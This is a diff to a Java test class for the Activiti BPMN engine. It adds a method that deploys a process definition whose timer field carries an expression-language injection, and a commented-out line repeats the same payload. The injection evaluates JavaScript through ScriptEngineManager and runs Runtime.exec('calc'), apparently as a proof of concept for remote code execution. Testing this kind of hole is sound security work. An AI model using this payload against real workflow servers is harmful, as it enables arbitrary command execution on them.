@@ -29,11 +29,47 @@ import org.activiti.bpmn.model.*;
 public class BpmnTest {
     public static void main(String[] args) throws Exception {
 //        testFilePath();
-
-        realCase1();
+            test();
+//        realCase1();
 //        ScriptEngineManager scriptEngineManager = (ScriptEngineManager)Class.forName("javax.script.ScriptEngineManager").newInstance();
 //        scriptEngineManager.getEngineByName("js").eval("function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\"calc\")");
     }
+
+    public static void test(){
+        String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
+                "<bpmn2:definitions\n" +
+                "        xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
+                "        xmlns:bpmn2=\"http://www.omg.org/spec/BPMN/20100524/MODEL\"\n" +
+                "        xmlns:bpmndi=\"http://www.omg.org/spec/BPMN/20100524/DI\"\n" +
+                "        xmlns:dc=\"http://www.omg.org/spec/DD/20100524/DC\"\n" +
+                "        targetNamespace=\"http://bpmn.io/schema/bpmn\"\n" +
+                "        id=\"sample-diagram\">\n" +
+                "    <bpmn2:process id=\"RankMovieId\" name=\"RankMovie\" isExecutable=\"true\">\n" +
+                "        <bpmn2:startEvent id=\"StartEvent_1\">\n" +
+                "            <bpmn2:timerEventDefinition>\n" +
+                "                <bpmn2:timeDuration>\n" +
+                "                    ${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance()\n" +
+                "                    .getEngineByName(\"js\").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\\'calc\\')')}\n" +
+                "                </bpmn2:timeDuration>\n" +
+                "            </bpmn2:timerEventDefinition>\n" +
+                "        </bpmn2:startEvent>\n" +
+                "    </bpmn2:process>\n" +
+                "    <bpmndi:BPMNDiagram id=\"BPMNDiagram_1\">\n" +
+                "        <bpmndi:BPMNPlane id=\"BPMNPlane_1\" bpmnElement=\"RankMovieId\">\n" +
+                "            <bpmndi:BPMNShape id=\"_BPMNShape_StartEvent_2\" bpmnElement=\"StartEvent_1\">\n" +
+                "                <dc:Bounds x=\"206\" y=\"143\" width=\"36\" height=\"36\" />\n" +
+                "            </bpmndi:BPMNShape>\n" +
+                "        </bpmndi:BPMNPlane>\n" +
+                "    </bpmndi:BPMNDiagram>\n" +
+                "</bpmn2:definitions>";
+        ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();
+        RepositoryService repositoryService = processEngine.getRepositoryService();
+
+        DeploymentBuilder deploymentBuilder = repositoryService.createDeployment();
+        deploymentBuilder.addString("readCase.bpmn20.xml",xml);
+        Deployment deploy = deploymentBuilder.deploy();
+    }
+
 
     public static void testFilePath() throws Exception {
         // 读取指定文件，并解析文件内容转为BpmnModel对象
